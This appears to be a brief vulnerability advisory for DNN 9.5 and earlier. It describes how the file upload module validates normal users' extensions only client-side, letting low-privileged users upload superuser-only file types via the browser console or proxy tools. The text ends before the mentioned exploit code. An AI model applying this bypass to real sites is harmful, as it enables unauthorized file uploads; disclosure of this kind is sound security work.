# Version: <= 9.5

The DNN has a file upload module for superuser. As a superuser, you can upload files with the following formats — “jpg, jpeg, jpe, gif, bmp, png, svg, ttf, eot, woff, doc, docx, xls, xlsx, ppt, pptx, pdf, txt, xml, xsl, xsd, css, zip, rar, template, htmtemplate, ico, avi, mpg, mpeg, mp3, wmv, mov, wav, mp4, webm, ogv”.

As a normal user you are allowed to upload files with “bmp,gif,ico,jpeg,jpg,jpe,png,svg” extensions. The same file upload module used for superuser is reused for normal users with extra validation for a few additional extensions e.g. CSS extension is not allowed.

Unfortunately, only for superuser, whitelisted extension check is performed at the server end. For normal users, extra extension validation is performed at client-side only. Hence, a low privileged normal user can bypass the client-side validation and upload files with extensions which are allowed only for superuser only.

For example, a normal privileged user can upload a file with extension which is allowed only for superuser, by executing the following code on a browser’s console (in the tab that manages profile’s page has opened). This attack may also be performed using proxy tools such as Burp, ZAP etc.
